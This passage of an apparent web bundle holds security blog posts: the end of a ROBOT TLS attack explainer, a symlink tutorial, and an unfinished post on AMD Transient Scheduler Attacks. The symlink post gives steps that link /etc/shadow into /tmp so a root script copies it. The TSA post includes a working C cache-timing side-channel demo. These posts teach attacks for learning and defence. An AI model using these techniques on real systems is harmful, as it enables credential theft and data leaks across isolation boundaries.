          <li><b>Oracle Response:</b> The server attempts to decrypt the ciphertext and responds with information revealing whether the decryption was successful.</li>
          <li><b>Iteration Process:</b> The attacker uses the server’s responses to refine their guesses, repeating this process multiple times.</li>
          <li><b>Decryption of Sensitive Data:</b> After enough iterations, the attacker can decrypt sensitive data such as TLS session keys.</li>
        </ol>

        <h2>Real-World Example of ROBOT</h2>
        <p>
          To better understand how this attack can be used in real-world scenarios, consider a web server that uses RSA encryption to secure TLS connections. If the server’s RSA implementation is vulnerable, an attacker can exploit it to decrypt sensitive information.
        </p>
        <p>
          For example, if a banking website is vulnerable to ROBOT, an attacker could gain access to the TLS session keys, which would allow them to decrypt sensitive information such as login credentials, transaction details, and personal user data. This could lead to serious breaches in confidentiality and data security.
        </p>

        <h2>Affected Systems</h2>
        <p>Various widely-used products have been found vulnerable to ROBOT, including:</p>
        <ul>
          <li>OpenSSL (before version 1.0.2h)</li>
          <li>F5 Networks BIG-IP load balancers</li>
          <li>Cisco devices</li>
          <li>Certain Oracle and Citrix products</li>
        </ul>
        <p>
          Though many systems have since been patched, ROBOT still poses a risk to any system that hasn’t been updated to mitigate this vulnerability.
        </p>

        <h2>Mitigation and Prevention</h2>
        <p>
          Preventing ROBOT attacks requires system administrators and developers to ensure that their RSA implementations are correctly configured. Here are some steps to mitigate the risk of ROBOT:
        </p>
        <ul>
          <li><b>Disable RSA Encryption:</b> The most effective protection is to disable RSA key exchange in favor of Elliptic Curve Diffie-Hellman (ECDHE), which provides forward secrecy and is not vulnerable to ROBOT.</li>
          <li><b>Apply Security Patches:</b> Ensure that you’re using the latest versions of your software libraries and applying all relevant security patches. For instance, upgrading to OpenSSL 1.0.2h or later will mitigate the ROBOT attack.</li>
          <li><b>Implement Stronger Cryptographic Methods:</b> Use stronger encryption protocols such as Elliptic Curve Cryptography (ECC) to secure communications. ECC-based methods, like ECDHE, are considered more secure and resistant to attacks like ROBOT.</li>
          <li><b>Regular Vulnerability Testing:</b> Conduct routine vulnerability assessments and audits to identify and address potential misconfigurations or weaknesses in cryptographic implementations.</li>
        </ul>

        <h3>Example of Mitigation in OpenSSL:</h3>
<div class="code-block">
  <code>
    ssl_protocols TLSv1.2 TLSv1.3;
    ssl_prefer_server_ciphers on;
    ssl_ciphers 'ECDHE-ECDSA-AES256-GCM-SHA384:ECDHE-RSA-AES256-GCM-SHA384';
  </code>
</div>
<p>
  This configuration forces the server to use Elliptic Curve Diffie-Hellman key exchange methods, providing forward secrecy and reducing the risk of a ROBOT attack.
</p>

        <h2>Conclusion</h2>
        <p>
          The ROBOT attack underscores how vulnerabilities from decades ago can resurface in modern systems due to misconfigurations or unpatched software. Although the original Bleichenbacher attack was discovered in 1998, its return in 2017 highlights the importance of staying vigilant in cryptographic practices and regularly updating systems.
        </p>
        <p>
          By disabling RSA key exchanges, patching vulnerable systems, and implementing stronger encryption protocols, administrators can effectively mitigate the risk of ROBOT attacks and protect sensitive data.
        </p>
      </div>
    </section>
  </main>

  <!-- FOOTER -->
  <footer class="footer">
    <div class="container">
      <p>&copy; 2024 Hem Parekh | All rights reserved.</p>
    </div>
  </footer>

  <!-- Link to JS for theme toggle -->
  <script src="script.js"><\/script>
</body>
</html>`,vv=`<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>Exploring Symlinks: Practical Usage and Security Implications</title>

  <!-- Link to the common style for light/dark mode -->
  <link rel="stylesheet" href="style.css" />
</head>
<body class="dark">

  <!-- NAVBAR -->
  <nav class="navbar">
    <div class="container nav-container">
      <div class="logo">Hem Parekh's Blog</div>
      <ul class="nav-links">
        <li><a href="index.html#home">Home</a></li>
        <li><a href="index.html#about">About</a></li>
        <li><a href="index.html#experience">Experience</a></li>
        <li><a href="index.html#projects">Projects</a></li>
        <li><a href="blogs.html" class="active">Blog</a></li>
      </ul>
      <!-- Theme Toggle Button -->
      <button class="theme-toggle" id="themeToggle">Light Mode</button>
    </div>
  </nav>

  <!-- BLOG POST HEADER -->
  <header class="blog-post-header">
    <div class="container">
      <h1 class="blog-post-title">Exploring Symlinks: Practical Usage and Security Implications</h1>
      <p class="blog-post-date">Published on: December 24, 2024</p>
    </div>
  </header>

  <!-- BLOG POST CONTENT -->
  <section class="blog-post-content">
    <div class="container">
      <div class="blog-text">
        <h2>What Are Symlinks?</h2>
        <p>
          In Linux, symbolic links are essentially shortcuts that point to other files or directories. They allow you to reference a file or directory without duplicating its contents. Symlinks are incredibly useful when you need to access or organize files in multiple locations. However, if used carelessly, they can create security vulnerabilities, particularly when root-owned processes interact with user-created symlinks.
        </p>

        <h3>Hard Links vs. Symbolic Links</h3>
        <ul>
          <li><strong>Hard Links:</strong> Direct references to data on disk. Hard links share the same inode with the original file, meaning they’re identical and can’t link to directories.</li>
          <li><strong>Symbolic Links (Symlinks):</strong> References that point to the path of a target file or directory. Symlinks are separate from the original file’s data, so deleting the target will break the link.</li>
        </ul>

        <h2>Creating and Using Symlinks</h2>
        <p>The basic syntax for creating a symlink is:</p>
        <div class="code-block">
          <code>ln -s [target] [symlink_name]</code>
        </div>
        <p>
          • <strong>[target]:</strong> The file or directory you want to link to.<br>
          • <strong>[symlink_name]:</strong> The name of your symlink.
        </p>

        <h3>Examples</h3>
        <div class="code-block">
          <code>
# Creating a symlink to a file<br>
ln -s /home/user/documents/file.txt /home/user/desktop/file_link.txt
          </code>
        </div>
        <p>This creates <code>file_link.txt</code> on your desktop, which behaves like a shortcut to <code>file.txt</code>.</p>

        <div class="code-block">
          <code>
# Creating a symlink to a directory<br>
ln -s /home/user/projects /home/user/desktop/projects_link
          </code>
        </div>
        <p>Accessing <code>projects_link</code> will take you directly to <code>/home/user/projects</code>.</p>

        <h3>Overwriting an Existing Symlink</h3>
        <div class="code-block">
          <code>ln -sf /new/target/path /path/to/existing_symlink</code>
        </div>
        <p>The <code>-f</code> option forces the update of the symlink’s target.</p>

        <h2>Privilege Escalation Using Symlinks</h2>
        <p>
          During my Hack The Box challenge, I learned how symlinks can be used to escalate privileges when system configurations are insecure. Here’s how this works:
        </p>

        <h3>Scenario: Exploiting a Root-Owned Script</h3>
        <p>
          Imagine a script (<code>backup.sh</code>) owned by root regularly copies files from a directory to a root-owned backup location. If the script is designed to follow any symlinks it encounters, this could give normal users access to root-level files.
        </p>

        <h3>Steps to Exploit</h3>
        <div class="code-block">
          <code>
# Step 1: Remove any existing file at /tmp/important_file<br>
rm -f /tmp/important_file<br><br>
# Step 2: Create a symlink pointing to /etc/shadow<br>
ln -s /etc/shadow /tmp/important_file<br><br>
# Step 3: Wait for the root script to run or run it manually if possible<br>
          </code>
        </div>
        <p>
          If the root script copies <code>/etc/shadow</code> to a location accessible to the user, the user can potentially gain root-level information and escalate privileges.
        </p>

        <h2>Mitigating This Exploit</h2>
        <ul>
          <li><strong>Avoid Following Symlinks in Scripts:</strong> Avoid copying or modifying files without checking for symlinks, especially in root-owned scripts.</li>
          <li><strong>Use the <code>-P</code> Option in <code>cp</code>:</strong> This flag tells <code>cp</code> not to follow symlinks, helping to prevent exploitation.</li>
          <li><strong>Restrict Writable Directories:</strong> Limit permissions on directories where files are written or manipulated by privileged processes.</li>
        </ul>

        <h2>Conclusion</h2>
        <p>
          Symlinks are an incredibly powerful tool for managing files and directories, but they come with inherent risks if not handled carefully. Understanding how symlinks work and the potential security implications is critical for both system administrators and security professionals. Whether you're organizing files or working on penetration testing challenges, symlinks offer both utility and insight into system-level operations.
        </p>
      </div>
    </div>
  </section>

  <!-- FOOTER -->
  <footer class="footer">
    <div class="container">
      <p>&copy; 2024 Hem Parekh | All rights reserved.</p>
    </div>
  </footer>

  <!-- Link to JS for theme toggle -->
  <script src="script.js"><\/script>
</body>
</html>`,yv=`<div class="markdown-heading"><h1 class="heading-element">Transient Scheduler Attacks on CPUs: Exploiting AMD’s New Microarchitectural Leak</h1><a id="user-content-transient-scheduler-attacks-on-cpus-exploiting-amds-new-microarchitectural-leak" class="anchor" aria-label="Permalink: Transient Scheduler Attacks on CPUs: Exploiting AMD’s New Microarchitectural Leak" href="#transient-scheduler-attacks-on-cpus-exploiting-amds-new-microarchitectural-leak"><span aria-hidden="true" class="octicon octicon-link"></span></a></div>
<p>In 2018, <em>Spectre</em> and <em>Meltdown</em> taught everyone that “just running code” on a CPU was enough to leak data you were <em>never</em> supposed to see. We patched, mitigated, and told ourselves the worst was over.</p>
<p>Fast-forward to 2025 and AMD quietly drops a new phrase into the hardware-security lexicon:</p>
<blockquote>
<p><strong>Transient Scheduler Attacks (TSA)</strong> – a fresh class of speculative side-channel leaks in AMD CPUs, abusing the <em>instruction scheduler</em> itself.</p>
</blockquote>
<p>If Spectre was about mispredicted branches and Meltdown about rogue loads, TSA is about <strong>“false completions”</strong>: the CPU momentarily believes a load has finished and forwards <em>invalid</em> data into dependent instructions. That data isn’t architecturally visible—but it <em>does</em> change how long later instructions take to execute, and those timing differences leak information across privilege boundaries.</p>
<p>In this post, we’ll unpack TSA from a red-team mindset:</p>
<ul>
<li>What TSA actually is (minus marketing),</li>
<li>How an attacker could <em>conceptually</em> exploit it,</li>
<li>A tiny lab you can build to “feel” this class of leak,</li>
<li>And what defenders should do before their schedulers start talking.</li>
</ul>
<hr>
<div class="markdown-heading"><h2 class="heading-element">1. Quick refresher: speculative execution &amp; side-channels</h2><a id="user-content-1-quick-refresher-speculative-execution--side-channels" class="anchor" aria-label="Permalink: 1. Quick refresher: speculative execution &amp; side-channels" href="#1-quick-refresher-speculative-execution--side-channels"><span aria-hidden="true" class="octicon octicon-link"></span></a></div>
<p>Modern CPUs are performance junkies. They:</p>
<ul>
<li>
<strong>Speculatively execute</strong> instructions before they’re 100% sure they’re needed (branch prediction, memory prediction, etc.).</li>
<li>
<strong>Out-of-order schedule</strong> instructions to keep execution units busy.</li>
<li>
<strong>Forward data</strong> between loads and stores without waiting for the full memory pipeline.</li>
</ul>
<p>Most of the time, that works great. Occasionally, it creates <strong>transient states</strong> where:</p>
<ol>
<li>The CPU does some work based on <em>guessed</em> information,</li>
<li>Later realizes it guessed wrong,</li>
<li>Rolls back the architectural state…</li>
<li>But the <strong>microarchitectural state</strong> (caches, predictors, queues, timing) still remembers what happened.</li>
</ol>
<p>Classic attacks:</p>
<ul>
<li>
<strong>Spectre</strong>: abuse branch prediction → transiently execute code that touches secret-dependent memory → leak via cache timing.</li>
<li>
<strong>Meltdown / Foreshadow / MDS</strong>: abuse permission checks and internal buffers to read data across isolation boundaries.</li>
</ul>
<p>TSA is the same story <em>one layer deeper</em>: not the branch predictor, not the cache hierarchy, but the <strong>scheduler and its perception of whether a load is “done.”</strong></p>
<hr>
<div class="markdown-heading"><h2 class="heading-element">2. What AMD calls “Transient Scheduler Attacks”</h2><a id="user-content-2-what-amd-calls-transient-scheduler-attacks" class="anchor" aria-label="Permalink: 2. What AMD calls “Transient Scheduler Attacks”" href="#2-what-amd-calls-transient-scheduler-attacks"><span aria-hidden="true" class="octicon octicon-link"></span></a></div>
<p>AMD’s 2025 security bulletin and technical whitepaper describe TSA as a new speculative side channel that appears when certain <strong>load instructions experience “false completion.”</strong></p>
<div class="markdown-heading"><h3 class="heading-element">2.1 False completions in a nutshell</h3><a id="user-content-21-false-completions-in-a-nutshell" class="anchor" aria-label="Permalink: 2.1 False completions in a nutshell" href="#21-false-completions-in-a-nutshell"><span aria-hidden="true" class="octicon octicon-link"></span></a></div>
<p>Under specific timing and microarchitectural conditions:</p>
<ol>
<li>A load instruction is expected to hit in a fast structure (e.g., L1 cache).</li>
<li>Hardware <em>optimistically</em> assumes the data will be ready quickly.</li>
<li>Dependent operations get scheduled based on that assumption.</li>
<li>But something goes wrong – the load <em>didn’t</em> actually complete (it missed in L1, or the store data isn’t ready, etc.).</li>
<li>The CPU forwards <strong>invalid data</strong> to dependent instructions temporarily.</li>
<li>The load is later re-executed with the correct data, and dependents re-run.</li>
</ol>
<p>Crucially:</p>
<ul>
<li>You don’t get a pipeline flush like some other transient behaviors.</li>
<li>That invalid data <strong>doesn’t update caches or TLBs</strong>, so you can’t see it with classic cache-based side-channels.</li>
<li>But the invalid data <em>does</em> influence the <strong>timing</strong> of other instructions in the core, and that timing is observable.</li>
</ul>
<p>Hence: <strong>Transient Scheduler Attacks</strong> – you leak data by watching how the scheduler behaves when it has been lied to.</p>
<div class="markdown-heading"><h3 class="heading-element">2.2 Two main variants: TSA-L1 and TSA-SQ</h3><a id="user-content-22-two-main-variants-tsa-l1-and-tsa-sq" class="anchor" aria-label="Permalink: 2.2 Two main variants: TSA-L1 and TSA-SQ" href="#22-two-main-variants-tsa-l1-and-tsa-sq"><span aria-hidden="true" class="octicon octicon-link"></span></a></div>
<p>AMD’s technical guidance splits TSA into two sub-variants:</p>
<ul>
<li>
<p><strong>TSA-L1 (L1 data cache variant)</strong></p>
<ul>
<li>Modern AMD cores use a <strong>microtag</strong> structure to accelerate L1 lookups.</li>
<li>In some edge cases, the microtag says “hit” when the real L1 line isn’t there.</li>
<li>The load experiences a false completion and receives invalid data from whatever was associated with that microtag entry.</li>
<li>An attacker who can repeatedly engineer this state can infer <strong>what’s in the L1 cache</strong>, even if it belongs to:
<ul>
<li>OS kernel vs user process,</li>
<li>Hypervisor vs guest VM,</li>
<li>One VM vs another.</li>
</ul>
</li>
</ul>
</li>
<li>
<p><strong>TSA-SQ (store queue variant)</strong></p>
<ul>
<li>The store queue tracks in-flight stores and sometimes forwards their data to matching loads (<strong>Store-To-Load Forwarding</strong>).</li>
<li>In some timing windows, a load that matches an older store may see a false completion where invalid data comes from a <em>previous</em> occupant of that store-queue entry.</li>
<li>An attacker may infer data from older stores—potentially across kernel/user boundaries—but cross-VM leakage here appears more limited.</li>
</ul>
</li>
</ul>
<p>So TSA-L1 is your <strong>“peek into L1 from another context”</strong> scenario, whereas TSA-SQ is more like <strong>“see what older stores were doing”</strong> if you can hit the timing window.</p>
<div class="markdown-heading"><h3 class="heading-element">2.3 Affected CPUs &amp; severity</h3><a id="user-content-23-affected-cpus--severity" class="anchor" aria-label="Permalink: 2.3 Affected CPUs &amp; severity" href="#23-affected-cpus--severity"><span aria-hidden="true" class="octicon octicon-link"></span></a></div>
<ul>
<li>TSA affects <strong>AMD Family 19h</strong> processors (Zen 3 / Zen 4 class parts, including EPYC and Ryzen families).</li>
<li>Individual CVEs are rated in the “medium” band, but collectively TSA is treated as a <strong>speculative side-channel class</strong> that can leak data across privilege boundaries.</li>
<li>AMD is shipping <strong>microcode updates</strong> plus OS/hypervisor guidance; the Linux kernel added a dedicated <code>MITIGATION_TSA</code> config option and a <code>tsa=</code> boot parameter to toggle mitigation strategies.</li>
</ul>
<p>In other words: TSA isn’t “you can RCE the CPU via JavaScript,” but it <em>is</em> “if an attacker can run code on the same CPU, they may spy on higher-privileged contexts.”</p>
<hr>
<div class="markdown-heading"><h2 class="heading-element">3. How would an attacker actually abuse TSA?</h2><a id="user-content-3-how-would-an-attacker-actually-abuse-tsa" class="anchor" aria-label="Permalink: 3. How would an attacker actually abuse TSA?" href="#3-how-would-an-attacker-actually-abuse-tsa"><span aria-hidden="true" class="octicon octicon-link"></span></a></div>
<p>From a red-team point of view, TSA is about <strong>turning local code execution into a powerful side-channel primitive</strong>.</p>
<p>AMD is quite explicit about preconditions:</p>
<blockquote>
<p>TSA is likely only exploitable if the attacker can run arbitrary code on the machine and can repeatedly trigger victim activity to build up a measurable signal.</p>
</blockquote>
<p>So think <strong>“post-compromise escalation / stealth data theft”</strong>, not “remote drive-by.”</p>
<div class="markdown-heading"><h3 class="heading-element">3.1 Threat models that actually make sense</h3><a id="user-content-31-threat-models-that-actually-make-sense" class="anchor" aria-label="Permalink: 3.1 Threat models that actually make sense" href="#31-threat-models-that-actually-make-sense"><span aria-hidden="true" class="octicon octicon-link"></span></a></div>
<p>Some realistic scenarios:</p>
<ol>
<li>
<p><strong>Malicious VM in a public cloud</strong></p>
<ul>
<li>You rent a VM on a shared EPYC host.</li>
<li>You arrange your workload so that:
<ul>
<li>Your VM executes carefully crafted load/store sequences, trying to create false completions,</li>
<li>You constantly measure timing of your own code,</li>
<li>You synchronize with a high-value victim VM (e.g., by hitting its web API, causing it to perform sensitive operations repeatedly).</li>
</ul>
</li>
<li>Over many iterations, you try to reconstruct bits of secrets used in the victim: crypto keys, keystroke patterns, or data-dependent control paths.</li>
</ul>
</li>
<li>
<p><strong>Untrusted plugin / extension in a multi-tenant app</strong></p>
<ul>
<li>Think: a plugin system where tenants can upload native or WASM modules and get CPU time on the same host as privileged code.</li>
<li>The plugin runs malicious code that tries to observe kernel or hypervisor behavior via TSA-style timing leaks, especially across system calls or hypercalls.</li>
</ul>
</li>
<li>
<p><strong>Malware on a bare-metal server</strong></p>
<ul>
<li>Traditional malware already has local execution.</li>
<li>TSA gives it a way to break isolation between:
<ul>
<li>Normal user processes and privileged daemons,</li>
<li>Or between containers that happen to share cores.</li>
</ul>
</li>
</ul>
</li>
</ol>
<p>In <em>all</em> these cases, TSA doesn’t give you code execution; it gives you a <strong>new, stealthy information-leak channel</strong> once you’re on the box.</p>
<div class="markdown-heading"><h3 class="heading-element">3.2 What does “exploitation” look like?</h3><a id="user-content-32-what-does-exploitation-look-like" class="anchor" aria-label="Permalink: 3.2 What does “exploitation” look like?" href="#32-what-does-exploitation-look-like"><span aria-hidden="true" class="octicon octicon-link"></span></a></div>
<p>High-level exploitation strategy (similar in spirit to other speculative side channels):</p>
<ol>
<li>
<p><strong>Prime microarchitectural state</strong></p>
<ul>
<li>Arrange L1 cache or store queue to contain patterns that encode guesses about victim data (or vice versa).</li>
</ul>
</li>
<li>
<p><strong>Trigger victim computation</strong></p>
<ul>
<li>System call, network request, hypercall—anything that causes the victim to touch sensitive data.</li>
<li>Repeat this many times so you can average out noise.</li>
</ul>
</li>
<li>
<p><strong>Force false completions</strong></p>
<ul>
<li>Using carefully chosen addresses and instruction sequences, steer certain victim or attacker loads into the microtag / store-queue corner cases described in TSA-L1 and TSA-SQ.</li>
</ul>
</li>
<li>
<p><strong>Measure timing in attacker context</strong></p>
<ul>
<li>The invalid forwarded data doesn’t leak directly, but it changes how long later instructions take to execute.</li>
<li>By correlating timing patterns with what you know you primed, you infer bits of secret state in the victim’s cache lines or stores.</li>
</ul>
</li>
<li>
<p><strong>Do this… a lot</strong></p>
<ul>
<li>TSA is noisy. You typically need many victim invocations to create a measurable signal.</li>
</ul>
</li>
</ol>
<p>If that sounds abstract, that’s because it is—<strong>real TSA exploitation is non-trivial</strong>. But you can build a lab to internalize the shape of the attack.</p>
<hr>
<div class="markdown-heading"><h2 class="heading-element">4. A tiny lab to “feel” scheduler-style leaks (with code)</h2><a id="user-content-4-a-tiny-lab-to-feel-scheduler-style-leaks-with-code" class="anchor" aria-label="Permalink: 4. A tiny lab to “feel” scheduler-style leaks (with code)" href="#4-a-tiny-lab-to-feel-scheduler-style-leaks-with-code"><span aria-hidden="true" class="octicon octicon-link"></span></a></div>
<p>We’re still <strong>not</strong> reproducing TSA itself (that’s complex research), but we can build a lab that:</p>
<ul>
<li>Shows how <strong>secret-dependent memory access → timing difference → information leak</strong> works, and</li>
<li>Uses patterns similar to what real speculative / transient attacks exploit.</li>
</ul>
<p>Think of this as a <strong>Flush+Reload / cache timing 101</strong> exercise that warms people up conceptually for TSA.</p>
<blockquote>
<p><g-emoji class="g-emoji" alias="warning">⚠️</g-emoji> Educational only. Run this only on machines you own. Don’t point this at shared environments you don’t control.</p>
</blockquote>
<div class="markdown-heading"><h3 class="heading-element">4.1 Full toy example: secret-dependent access + timing</h3><a id="user-content-41-full-toy-example-secret-dependent-access--timing" class="anchor" aria-label="Permalink: 4.1 Full toy example: secret-dependent access + timing" href="#41-full-toy-example-secret-dependent-access--timing"><span aria-hidden="true" class="octicon octicon-link"></span></a></div>
<p>This is a self-contained C toy that:</p>
<ul>
<li>Has a “secret” byte,</li>
<li>A victim function that touches memory depending on that secret,</li>
<li>An attacker that measures which memory line is “hot” by timing loads with <code>rdtsc</code>.</li>
</ul>
<div class="highlight highlight-source-c"><pre><span class="pl-c">// gcc -O2 -march=native -o tsa_toy tsa_toy.c</span>
<span class="pl-c">// Simple educational cache timing demo:</span>
<span class="pl-c">//  - victim_operation() uses a secret-dependent index</span>
<span class="pl-c">//  - attacker measures which index is fastest to infer the secret</span>

<span class="pl-k">#define</span> <span class="pl-s1">_GNU_SOURCE</span>
<span class="pl-k">#include</span> <span class="pl-s">&lt;stdio.h&gt;</span>
<span class="pl-k">#include</span> <span class="pl-s">&lt;stdint.h&gt;</span>
<span class="pl-k">#include</span> <span class="pl-s">&lt;x86intrin.h&gt;</span>   <span class="pl-c">// for __rdtscp, _mm_clflush</span>
<span class="pl-k">#include</span> <span class="pl-s">&lt;unistd.h&gt;</span>
<span class="pl-k">#include</span> <span class="pl-s">&lt;limits.h&gt;</span>

<span class="pl-k">#define</span> <span class="pl-c1">STRIDE</span> 4096      // ensure different cache lines
<span class="pl-k">#define</span> <span class="pl-c1">PROBE_SIZE</span> 256

<span class="pl-c">// Shared array used as our "probe" for timing</span>
<span class="pl-smi">uint8_t</span> <span class="pl-s1">probe_array</span>[<span class="pl-c1">PROBE_SIZE</span> <span class="pl-c1">*</span> <span class="pl-c1">STRIDE</span>];

<span class="pl-c">// Fake secret we want to "leak"</span>
<span class="pl-k">volatile</span> <span class="pl-smi">uint8_t</span> <span class="pl-s1">secret</span> <span class="pl-c1">=</span> <span class="pl-c1">0x42</span>;  <span class="pl-c">// 66 decimal</span>

<span class="pl-c">// Victim: uses attacker-controlled hint, mixed with secret, to pick an index</span>
<span class="pl-smi">void</span> <span class="pl-en">victim_operation</span>(<span class="pl-smi">uint8_t</span> <span class="pl-s1">attacker_hint</span>) {
    <span class="pl-smi">uint8_t</span> <span class="pl-s1">idx</span> <span class="pl-c1">=</span> <span class="pl-s1">attacker_hint</span> ^ <span class="pl-s1">secret</span>;  <span class="pl-c">// secret-dependent index</span>
    <span class="pl-k">volatile</span> <span class="pl-smi">uint8_t</span> <span class="pl-c1">*</span><span class="pl-s1">addr</span> <span class="pl-c1">=</span> <span class="pl-c1">&amp;</span><span class="pl-s1">probe_array</span>[<span class="pl-s1">idx</span> <span class="pl-c1">*</span> <span class="pl-c1">STRIDE</span>];

    <span class="pl-c">// Load from secret-dependent location</span>
    <span class="pl-smi">uint8_t</span> <span class="pl-s1">value</span> <span class="pl-c1">=</span> <span class="pl-c1">*</span><span class="pl-s1">addr</span>;

    <span class="pl-c">// Prevent the compiler from optimizing away the load</span>
    __asm__ <span class="pl-k">volatile</span>(<span class="pl-s">""</span> :: <span class="pl-s">"r"</span>(<span class="pl-s1">value</span>) : <span class="pl-s">"memory"</span>);
}

<span class="pl-c">// Flush entire probe_array from caches</span>
<span class="pl-smi">void</span> <span class="pl-en">flush_probe_array</span>(<span class="pl-smi">void</span>) {
    <span class="pl-k">for</span> (<span class="pl-smi">int</span> <span class="pl-s1">i</span> <span class="pl-c1">=</span> <span class="pl-c1">0</span>; <span class="pl-s1">i</span> <span class="pl-c1">&lt;</span> <span class="pl-c1">PROBE_SIZE</span>; <span class="pl-s1">i</span><span class="pl-c1">++</span>) {
        <span class="pl-en">_mm_clflush</span>(<span class="pl-c1">&amp;</span><span class="pl-s1">probe_array</span>[<span class="pl-s1">i</span> <span class="pl-c1">*</span> <span class="pl-c1">STRIDE</span>]);
    }
}

<span class="pl-c">// Measure time to access probe_array[idx * STRIDE]</span>
<span class="pl-smi">uint32_t</span> <span class="pl-en">time_access</span>(<span class="pl-smi">int</span> <span class="pl-s1">idx</span>) {
    <span class="pl-smi">unsigned <span class="pl-smi">int</span></span> <span class="pl-s1">aux</span>;
    <span class="pl-k">volatile</span> <span class="pl-smi">uint8_t</span> <span class="pl-c1">*</span><span class="pl-s1">addr</span> <span class="pl-c1">=</span> <span class="pl-c1">&amp;</span><span class="pl-s1">probe_array</span>[<span class="pl-s1">idx</span> <span class="pl-c1">*</span> <span class="pl-c1">STRIDE</span>];

    <span class="pl-smi">uint64_t</span> <span class="pl-s1">t1</span> <span class="pl-c1">=</span> <span class="pl-en">__rdtscp</span>(<span class="pl-c1">&amp;</span><span class="pl-s1">aux</span>);
    (<span class="pl-smi">void</span>)<span class="pl-c1">*</span><span class="pl-s1">addr</span>;
    <span class="pl-smi">uint64_t</span> <span class="pl-s1">t2</span> <span class="pl-c1">=</span> <span class="pl-en">__rdtscp</span>(<span class="pl-c1">&amp;</span><span class="pl-s1">aux</span>);

    <span class="pl-k">return</span> (<span class="pl-smi">uint32_t</span>)(<span class="pl-s1">t2</span> <span class="pl-c1">-</span> <span class="pl-s1">t1</span>);
}

<span class="pl-smi">int</span> <span class="pl-en">main</span>(<span class="pl-smi">void</span>) {
    <span class="pl-c">// 1. Initialize array to force allocation</span>
    <span class="pl-k">for</span> (<span class="pl-smi">int</span> <span class="pl-s1">i</span> <span class="pl-c1">=</span> <span class="pl-c1">0</span>; <span class="pl-s1">i</span> <span class="pl-c1">&lt;</span> <span class="pl-c1">PROBE_SIZE</span> <span class="pl-c1">*</span> <span class="pl-c1">STRIDE</span>; <span class="pl-s1">i</span><span class="pl-c1">++</span>) {
        <span class="pl-s1">probe_array</span>[<span class="pl-s1">i</span>] <span class="pl-c1">=</span> <span class="pl-c1">1</span>;
    }

    <span class="pl-c">// Attacker chooses a hint. For simplicity we fix it.</span>
    <span class="pl-smi">uint8_t</span> <span class="pl-s1">attacker_hint</span> <span class="pl-c1">=</span> <span class="pl-c1">0x10</span>;

    <span class="pl-c">// 2. Flush the probe_array from cache</span>
    <span class="pl-en">flush_probe_array</span>();

    <span class="pl-c">// 3. Trigger victim many times to strengthen the signal</span>
    <span class="pl-k">for</span> (<span class="pl-smi">int</span> <span class="pl-s1">i</span> <span class="pl-c1">=</span> <span class="pl-c1">0</span>; <span class="pl-s1">i</span> <span class="pl-c1">&lt;</span> <span class="pl-c1">1000</span>; <span class="pl-s1">i</span><span class="pl-c1">++</span>) {
        <span class="pl-en">victim_operation</span>(<span class="pl-s1">attacker_hint</span>);
    }

    <span class="pl-c">// 4. Measure timing for each possible index and find fastest</span>
    <span class="pl-smi">uint32_t</span> <span class="pl-s1">best_time</span> <span class="pl-c1">=</span> <span class="pl-c1">UINT_MAX</span>;
    <span class="pl-smi">int</span> <span class="pl-s1">best_idx</span> <span class="pl-c1">=</span> <span class="pl-c1">-1</span>;

    <span class="pl-k">for</span> (<span class="pl-smi">int</span> <span class="pl-s1">idx</span> <span class="pl-c1">=</span> <span class="pl-c1">0</span>; <span class="pl-s1">idx</span> <span class="pl-c1">&lt;</span> <span class="pl-c1">PROBE_SIZE</span>; <span class="pl-s1">idx</span><span class="pl-c1">++</span>) {
        <span class="pl-smi">uint32_t</span> <span class="pl-s1">t</span> <span class="pl-c1">=</span> <span class="pl-en">time_access</span>(<span class="pl-s1">idx</span>);
        <span class="pl-k">if</span> (<span class="pl-s1">t</span> <span class="pl-c1">&lt;</span> <span class="pl-s1">best_time</span>) {
            <span class="pl-s1">best_time</span> <span class="pl-c1">=</span> <span class="pl-s1">t</span>;
            <span class="pl-s1">best_idx</span> <span class="pl-c1">=</span> <span class="pl-s1">idx</span>;
        }
    }

    <span class="pl-en">printf</span>(<span class="pl-s">"Best index = %d (time = %u cycles)\\n"</span>, <span class="pl-s1">best_idx</span>, <span class="pl-s1">best_time</span>);

    <span class="pl-c">// Recover an approximation of the secret</span>
    <span class="pl-smi">uint8_t</span> <span class="pl-s1">recovered</span> <span class="pl-c1">=</span> <span class="pl-s1">attacker_hint</span> ^ (<span class="pl-smi">uint8_t</span>)<span class="pl-s1">best_idx</span>;
    <span class="pl-en">printf</span>(<span class="pl-s">"Actual secret    = 0x%02x\\n"</span>, <span class="pl-s1">secret</span>);
    <span class="pl-en">printf</span>(<span class="pl-s">"Recovered secret = 0x%02x\\n"</span>, <span class="pl-s1">recovered</span>);

    <span class="pl-k">return</span> <span class="pl-c1">0</span>;
}</pre></div>
<p>What’s happening here:</p>
<ul>
<li>The victim repeatedly touches <code>probe_array[(attacker_hint ^ secret) * STRIDE]</code>,</li>
<li>That specific cache line becomes hot,</li>
<li>The attacker times every index and infers which is fastest,</li>
<li>From that <code>best_idx</code>, it guesses <code>secret ≈ attacker_hint ^ best_idx</code>.</li>
</ul>
<p>This is the <strong>same mental structure</strong> as real microarchitectural leaks: you never read the secret directly; you watch how <strong>transient microarchitectural state changes timing</strong>.</p>
<p>On a modern CPU, you may need to run it multiple times, average results, or tweak <code>PROBE_SIZE</code> / <code>STRIDE</code> to get a clear signal.</p>
<div class="markdown-heading"><h3 class="heading-element">4.2 Variant without <code>rdtsc</code>: using <code>clock_gettime</code>
</h3><a id="user-content-42-variant-without-rdtsc-using-clock_gettime" class="anchor" aria-label="Permalink: 4.2 Variant without rdtsc: using clock_gettime" href="#42-variant-without-rdtsc-using-clock_gettime"><span aria-hidden="true" class="octicon octicon-link"></span></a></div>
<p>If you want a version that doesn’t rely on <code>rdtsc</code> (e.g., on some systems it may be restricted or noisy), here’s a variant using <code>clock_gettime</code> with <code>CLOCK_MONOTONIC_RAW</code>. It’s less precise but more portable.</p>
<div class="highlight highlight-source-c"><pre><span class="pl-c">// gcc -O2 -march=native -o tsa_toy_posix tsa_toy_posix.c</span>

<span class="pl-k">#define</span> <span class="pl-s1">_GNU_SOURCE</span>
<span class="pl-k">#include</span> <span class="pl-s">&lt;stdio.h&gt;</span>
<span class="pl-k">#include</span> <span class="pl-s">&lt;stdint.h&gt;</span>
<span class="pl-k">#include</span> <span class="pl-s">&lt;time.h&gt;</span>
<span class="pl-k">#include</span> <span class="pl-s">&lt;x86intrin.h&gt;</span>   <span class="pl-c">// for _mm_clflush</span>
